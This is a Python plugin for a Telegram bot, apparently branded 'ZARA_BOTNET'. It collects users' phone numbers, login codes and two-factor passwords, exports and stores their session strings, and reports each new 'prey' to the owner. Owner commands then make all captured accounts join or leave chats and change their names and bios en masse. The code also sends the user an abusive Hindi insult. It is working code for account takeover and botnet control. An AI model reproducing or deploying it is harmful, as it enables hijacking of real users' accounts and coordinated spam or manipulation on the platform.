import asyncio
import unicodedata
from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid,
    PhoneNumberInvalid, UserNotParticipant, FloodWait
)

# Config, DB, and Motor for Stats
from config import API_ID, API_HASH, OWNER_ID, MONGO_URI
from core.database import add_session, remove_session
from motor.motor_asyncio import AsyncIOMotorClient

# ==========================================
# 📊 DATABASE (FOR LIFETIME STATS)
# ==========================================
mongo = AsyncIOMotorClient(MONGO_URI)
zara_db = mongo["ZARA_BOTNET"]
stats_col = zara_db["login_stats"]

async def update_total_logins():
    await stats_col.update_one({"_id": "stats"}, {"$inc": {"total": 1}}, upsert=True)

async def get_total_logins():
    doc = await stats_col.find_one({"_id": "stats"})
    return doc["total"] if doc else 0

# ==========================================
# 🎨 ZARA HACKER FONT ENGINE
# ==========================================
def sm(text):
    if not text: return ""
    text = str(text)
    normalized = unicodedata.normalize('NFKC', text)
    mapping = {'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴩ', 'q': 'ꞯ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ'}
    return "".join(mapping.get(c.lower(), c) for c in normalized)

# ==========================================
# ⚙️ SYSTEM CACHE
# ==========================================
LOGIN_DATA = {}
FORCE_CHANNELS = ["BMW_USERBOT_II", "REFLXHACKING"]

# ==========================================
# 🛑 STRICT FSUB CHECKER
# ==========================================
async def check_fsub_strict(client, user_id):
    for channel in FORCE_CHANNELS:
        try:
            member = await client.get_chat_member(channel, user_id)
            if member.status in [enums.ChatMemberStatus.LEFT, enums.ChatMemberStatus.BANNED]:
                return False
        except Exception:
            return False 
    return True

# ==========================================
# 🧹 AUTO-TRASH CLEANER
# ==========================================
async def timeout_clear(user_id):
    await asyncio.sleep(180) 
    if user_id in LOGIN_DATA:
        try: await LOGIN_DATA[user_id]["client"].disconnect()
        except: pass
        del LOGIN_DATA[user_id]

# ==========================================
# 💀 1. /ADD (SHORT TERMINAL INTERFACE)
# ==========================================
@Client.on_message(filters.command("add") & filters.private)
async def add_bot_start(client, message: Message):
    if not await check_fsub_strict(client, message.from_user.id):
        buttons = [
            [InlineKeyboardButton(sm("🔗 ɴᴇxᴜꜱ 01"), url="https://t.me/BMW_USERBOT_II"),
             InlineKeyboardButton(sm("🔗 ɴᴇxᴜꜱ 02"), url="https://t.me/REFLXHACKING")]
        ]
        return await message.reply(
            sm("🚫 ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ: ᴊᴏɪɴ ʙᴏᴛʜ ɢʀɪᴅꜱ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ."),
            reply_markup=InlineKeyboardMarkup(buttons)
        )
    
    user_id = message.from_user.id
    if user_id in LOGIN_DATA:
        try: await LOGIN_DATA[user_id]["client"].disconnect()
        except: pass
        del LOGIN_DATA[user_id]
        
    LOGIN_DATA[user_id] = {"state": "waiting_phone"}
    asyncio.create_task(timeout_clear(user_id))
    
    await message.reply(
        f" **{sm('zara terminal')}**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"❯ `{sm('enter phone number')}`\n"
        f"⌊ Format: `+919876543210`"
    )

# ==========================================
# 🔪 2. /REMOVE (ROOT & NORMAL KILL SWITCH)
# ==========================================
@Client.on_message(filters.command("remove"))
async def remove_bot(client, message: Message):
    user_id = message.from_user.id
    target_id = None
    
    if user_id == OWNER_ID:
        if message.reply_to_message:
            target_id = message.reply_to_message.from_user.id
        elif len(message.command) > 1:
            query = message.command[1]
            try:
                user_obj = await client.get_users(int(query) if query.isdigit() else query)
                target_id = user_obj.id
            except:
                return await message.reply(sm("❌ ᴛᴀʀɢᴇᴛ ᴍɪꜱꜱɪɴɢ!"))
        else:
            target_id = user_id 
    else:
        target_id = user_id 

    if target_id:
        status_msg = await message.reply(sm("🗑️ ɪɴɪᴛɪᴀᴛɪɴɢ ᴋɪʟʟ ꜱᴡɪᴛᴄʜ..."))
        found = False
        
        if hasattr(client, "userbots"):
            for bot in client.userbots:
                if bot.me.id == target_id:
                    try: await bot.log_out() 
                    except: pass
                    client.userbots.remove(bot)
                    found = True
                    break
        
        await remove_session(target_id)
        
        if found or user_id == target_id:
            await status_msg.edit(sm("💀 ꜱᴇꜱꜱɪᴏɴ ᴋɪʟʟᴇᴅ & ᴡɪᴘᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ɢʀɪᴅ."))
        else:
            await status_msg.edit(sm("⚠️ ɴᴏᴅᴇ ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ᴀᴄᴛɪᴠᴇ ɢʀɪᴅ."))

# ==========================================
# 📡 3. INPUT HANDLER (PHONE -> OTP -> 2FA)
# ==========================================
@Client.on_message(filters.text & filters.private)
async def login_handler(client, message: Message):
    if message.text.startswith("/"): return 
    user_id = message.from_user.id
    if user_id not in LOGIN_DATA: return

    state = LOGIN_DATA[user_id].get("state")
    text = message.text

    if state == "waiting_phone":
        msg = await message.reply(sm("⚡ `establishing_connection...`"))
        try:
            temp = Client(f"t_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await temp.connect()
            sent = await temp.send_code(text)
            
            LOGIN_DATA[user_id] = {"state": "waiting_otp", "client": temp, "phone": text, "hash": sent.phone_code_hash}
            await msg.edit(sm("📩 `payload_delivered.`\n\n❯ ᴇɴᴛᴇʀ ᴏᴛᴘ (ᴇx: 1 2 3 4 5)"))
        except Exception as e:
            await msg.edit(sm(f"❌ ꜰᴀɪʟᴇᴅ: {e}"))
            del LOGIN_DATA[user_id]

    elif state == "waiting_otp":
        otp = text.replace(" ", "").replace("-", "")
        data = LOGIN_DATA[user_id]
        
        try: await message.delete()
        except: pass

        msg = await message.reply(sm("🔐 `bypassing_security_gateway...`"))
        try:
            await data["client"].sign_in(data["phone"], data["hash"], phone_code=otp)
            await finalize(client, msg, data["client"], user_id)
        except SessionPasswordNeeded:
            LOGIN_DATA[user_id]["state"] = "waiting_password"
            await msg.edit(sm("🛡️ `2fa_firewall_detected!`\n\n❯ ᴇɴᴛᴇʀ ᴘᴀꜱꜱᴡᴏʀᴅ:"))
        except Exception as e:
            await msg.edit(sm(f"❌ ᴇʀʀᴏʀ: {e}"))

    elif state == "waiting_password":
        data = LOGIN_DATA[user_id]
        
        try: await message.delete()
        except: pass

        msg = await message.reply(sm("🔓 `cracking_encryption...`"))
        try:
            await data["client"].check_password(password=text)
            await finalize(client, msg, data["client"], user_id)
        except Exception as e:
            await msg.edit(sm(f"❌ ᴡʀᴏɴɢ ᴘᴀꜱꜱᴡᴏʀᴅ: {e}"))

# ==========================================
# 🎯 4. FINALIZATION & SIGMA ROAST
# ==========================================
async def finalize(manager_bot, msg, user_client, original_user_id, manual_session=None):
    try:
        await msg.edit(sm("🧬 `injecting_zara_kernel...`"))
        await asyncio.sleep(1)
        
        session_string = manual_session or await user_client.export_session_string()
        me = await user_client.get_me()
        
        if not await check_fsub_strict(user_client, me.id):
            await msg.edit(
                "🤬 **𝗢𝗨𝗞𝗔𝗔𝗧 𝗠𝗘 𝗥𝗘𝗛 𝗟𝗢𝗗𝗘!**\n\n"
                "Tu kya soch raha tha, naya number daal ke baap ko chutiya banayega? "
                "Pehle us naye number se dono ZARA GC join kar, warna aisi hi session maa chudati rahegi! 🖕\n\n"
                "💀 `[ 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗲𝗱 ]`"
            )
            try: await user_client.log_out() 
            except: pass
            if original_user_id in LOGIN_DATA: del LOGIN_DATA[original_user_id]
            return

        await update_total_logins()
        total_ever = await get_total_logins()
        active_now = len(manager_bot.userbots) + 1 if hasattr(manager_bot, "userbots") else 1

        safe_log = (
            f"🩸 {sm('new node secured')} 🩸\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 {sm('target')}: `{me.first_name}`\n"
            f"🆔 {sm('uid')}: `{me.id}`\n"
            f"📈 {sm('network load')}: `{active_now}`\n"
            f"💀 {sm('total preys')}: `{total_ever}`"
        )
        try: await manager_bot.send_message(OWNER_ID, safe_log)
        except: pass

        if original_user_id in LOGIN_DATA: del LOGIN_DATA[original_user_id]
            
        await add_session(me.id, session_string)
        
        new_ub = Client(f"ub_{me.id}", api_id=API_ID, api_hash=API_HASH, session_string=session_string, plugins=dict(root="plugins"), in_memory=True)
        new_ub.db = getattr(manager_bot, "db", None)
        new_ub.manager = manager_bot
        await new_ub.start()
        
        if not hasattr(manager_bot, "userbots"): manager_bot.userbots = []
        manager_bot.userbots.append(new_ub)

        final_payload = (
            f"✅ **{sm('authentication successful')}**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 **{sm('target')}**: {me.first_name}\n"
            f"🔑 **{sm('session key')}**:\n\n"
            f"`{session_string}`\n\n"
            f"⚠️ _{sm('do not share this key. system is now monitoring.')}_"
        )
        await msg.edit(final_payload)
        
    except Exception as e:
        await msg.edit(sm(f"❌ ꜱʏꜱᴛᴇᴍ ᴄʀᴀꜱʜ: {e}"))

# ==========================================
# 👑 5. ADVANCED ROOT FEATURES (OWNER ONLY)
# ==========================================

# ☠️ A. THE REAPER (Kills dead nodes)
@Client.on_message(filters.command(["syscheck", "reaper"]) & filters.user(OWNER_ID))
async def the_reaper(client, message: Message):
    if not hasattr(client, "userbots") or not client.userbots:
        return await message.reply(sm("⚠️ ɴᴏ ᴀᴄᴛɪᴠᴇ ꜱᴇꜱꜱɪᴏɴꜱ."))

    msg = await message.reply(sm("☠️ `scanning_grid...`"))
    total_scanned, killed, alive, dead_ids = 0, 0, 0, []

    for bot in list(client.userbots): 
        total_scanned += 1
        try:
            if not await check_fsub_strict(bot, bot.me.id):
                try: await bot.log_out()
                except: pass
                dead_ids.append(bot.me.id)
                client.userbots.remove(bot)
                killed += 1
            else:
                alive += 1
        except Exception:
            dead_ids.append(bot.me.id)
            client.userbots.remove(bot)
            killed += 1

    for d_id in dead_ids: await remove_session(d_id)
    await msg.edit(sm(f"💀 ʀᴇᴀᴘᴇʀ ꜱᴄᴀɴ ᴄᴏᴍᴘʟᴇᴛᴇ 💀\n━━━━━━━━━━━━━━━\n📊 ꜱᴄᴀɴɴᴇᴅ: {total_scanned}\n✅ ꜱᴀꜰᴇ: {alive}\n🔪 ᴋɪʟʟᴇᴅ: {killed}"))

# 🖥️ B. LIVE DASHBOARD (Check active nodes)
@Client.on_message(filters.command("nodes") & filters.user(OWNER_ID))
async def check_nodes(client, message: Message):
    if not hasattr(client, "userbots") or not client.userbots:
        return await message.reply(sm("⚠️ ᴢᴀʀᴀ ɢʀɪᴅ ɪꜱ ᴇᴍᴘᴛʏ. ɴᴏ ᴀᴄᴛɪᴠᴇ ɴᴏᴅᴇꜱ."))
    
    msg = f"🌐 **{sm('zara active grid')}** 🌐\n━━━━━━━━━━━━━━━\n"
    for i, bot in enumerate(client.userbots, 1):
        msg += f"**{i}.** `{bot.me.first_name}` `[{bot.me.id}]`\n"
    
    msg += f"━━━━━━━━━━━━━━━\n🔥 **{sm('total live nodes')}**: `{len(client.userbots)}`"
    await message.reply(msg)

# 🧲 C. MASS JOIN (Forces all bots to join a chat)
@Client.on_message(filters.command("massjoin") & filters.user(OWNER_ID))
async def mass_join(client, message: Message):
    if len(message.command) < 2:
        return await message.reply(sm("⚠️ ꜱʏɴᴛᴀx: /ᴍᴀꜱꜱᴊᴏɪɴ <ᴜꜱᴇʀɴᴀᴍᴇ/ʟɪɴᴋ>"))
    
    target_chat = message.command[1]
    if not hasattr(client, "userbots") or not client.userbots:
        return await message.reply(sm("⚠️ ɴᴏ ɴᴏᴅᴇꜱ ᴀᴠᴀɪʟᴀʙʟᴇ."))

    status = await message.reply(sm("🧲 `initiating_grid_invasion...`"))
    success, failed = 0, 0

    for bot in client.userbots:
        try:
            await bot.join_chat(target_chat)
            success += 1
            await asyncio.sleep(1)
        except FloodWait as e:
            await asyncio.sleep(e.value)
            failed += 1
        except Exception:
            failed += 1

    await status.edit(sm(f"🧲 **ɪɴᴠᴀꜱɪᴏɴ ʀᴇᴘᴏʀᴛ** 🧲\n━━━━━━━━━━━━━━━\n✅ ᴊᴏɪɴᴇᴅ: `{success}`\n❌ ꜰᴀɪʟᴇᴅ: `{failed}`"))

# 🚷 D. MASS LEAVE (Tactical Retreat - Forces all bots to leave a chat)
@Client.on_message(filters.command("massleave") & filters.user(OWNER_ID))
async def mass_leave(client, message: Message):
    if len(message.command) < 2:
        return await message.reply(sm("⚠️ ꜱʏɴᴛᴀx: /ᴍᴀꜱꜱʟᴇᴀᴠᴇ <ᴜꜱᴇʀɴᴀᴍᴇ/ɪᴅ>"))
    
    target_chat = message.command[1]
    if not hasattr(client, "userbots") or not client.userbots:
        return await message.reply(sm("⚠️ ɴᴏ ɴᴏᴅᴇꜱ ᴀᴠᴀɪʟᴀʙʟᴇ."))

    status = await message.reply(sm("🚷 `initiating_tactical_retreat...`"))
    success, failed = 0, 0

    for bot in client.userbots:
        try:
            await bot.leave_chat(target_chat)
            success += 1
            await asyncio.sleep(1)
        except FloodWait as e:
            await asyncio.sleep(e.value)
            failed += 1
        except Exception:
            failed += 1

    await status.edit(sm(f"🚷 **ʀᴇᴛʀᴇᴀᴛ ʀᴇᴘᴏʀᴛ** 🚷\n━━━━━━━━━━━━━━━\n✅ ʟᴇꜰᴛ: `{success}`\n❌ ꜰᴀɪʟᴇᴅ: `{failed}`"))

# 🎭 E. MASS BIO (Change Bio of all Bots)
@Client.on_message(filters.command("massbio") & filters.user(OWNER_ID))
async def mass_bio(client, message: Message):
    if len(message.command) < 2:
        return await message.reply(sm("⚠️ ꜱʏɴᴛᴀx: /ᴍᴀꜱꜱʙɪᴏ <ɴᴇᴡ ʙɪᴏ>"))
    
    new_bio = message.text.split(None, 1)[1]
    if not hasattr(client, "userbots") or not client.userbots:
        return await message.reply(sm("⚠️ ɴᴏ ɴᴏᴅᴇꜱ ᴀᴠᴀɪʟᴀʙʟᴇ."))

    status = await message.reply(sm("🎭 `overriding_network_identities...`"))
    success, failed = 0, 0

    for bot in client.userbots:
        try:
            await bot.update_profile(bio=new_bio)
            success += 1
            await asyncio.sleep(1)
        except FloodWait as e:
            await asyncio.sleep(e.value)
            failed += 1
        except Exception:
            failed += 1

    await status.edit(sm(f"🎭 **ɪᴅᴇɴᴛɪᴛʏ ᴏᴠᴇʀʀɪᴅᴇ** 🎭\n━━━━━━━━━━━━━━━\n✅ ᴜᴘᴅᴀᴛᴇᴅ: `{success}`\n❌ ꜰᴀɪʟᴇᴅ: `{failed}`"))

# 📛 F. MASS NAME (Change First Name of all Bots)
@Client.on_message(filters.command("massname") & filters.user(OWNER_ID))
async def mass_name(client, message: Message):
    if len(message.command) < 2:
        return await message.reply(sm("⚠️ ꜱʏɴᴛᴀx: /ᴍᴀꜱꜱɴᴀᴍᴇ <ɴᴇᴡ ɴᴀᴍᴇ>"))
    
    new_name = message.text.split(None, 1)[1]
    if not hasattr(client, "userbots") or not client.userbots:
        return await message.reply(sm("⚠️ ɴᴏ ɴᴏᴅᴇꜱ ᴀᴠᴀɪʟᴀʙʟᴇ."))

    status = await message.reply(sm("📛 `changing_network_designation...`"))
    success, failed = 0, 0

    for bot in client.userbots:
        try:
            await bot.update_profile(first_name=new_name)
            success += 1
            await asyncio.sleep(1)
        except FloodWait as e:
            await asyncio.sleep(e.value)
            failed += 1
        except Exception:
            failed += 1

    await status.edit(sm(f"📛 **ɴᴀᴍᴇ ᴏᴠᴇʀʀɪᴅᴇ** 📛\n━━━━━━━━━━━━━━━\n✅ ᴜᴘᴅᴀᴛᴇᴅ: `{success}`\n❌ ꜰᴀɪʟᴇᴅ: `{failed}`"))

